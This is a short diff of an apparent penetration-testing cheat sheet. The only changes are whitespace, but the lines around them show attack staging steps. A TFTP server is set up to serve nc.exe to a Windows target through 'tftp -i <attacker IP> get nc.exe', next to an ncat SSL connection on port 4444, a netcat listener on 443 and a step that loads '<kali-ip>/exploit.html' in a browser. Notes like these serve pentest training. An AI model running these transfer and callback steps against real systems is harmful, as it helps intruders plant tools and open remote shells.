@@ -32,11 +32,11 @@ Linux             ncat -nv 192.168.2.12 4444 --ssl
 
 # TFTP
 
-mkdir /tftp                                      Create a new home folder for tftp
-atftpd --daemon --port 69 /tftp                  Start tftp and assign home folder
-netstat -anup | grep atftp                       Verify the service is running
+mkdir /tftp                                            Create a new home folder for tftp
+atftpd --daemon --port 69 /tftp                        Start tftp and assign home folder
+netstat -anup | grep atftp                             Verify the service is running
 cp /usr/share/windows-binaries/nc.exe /tftp/
-tftp -i <attacker IP> get nc.exe                 Run from Windows
+tftp -i <attacker IP> get nc.exe                       Run from Windows
 ------------------------------------------------------------------------------------------------------
 
 # Wireshark
@@ -201,3 +201,4 @@ nc -lvp 443
 
 Windows
 Open IE to <kali-ip>/exploit.html
+
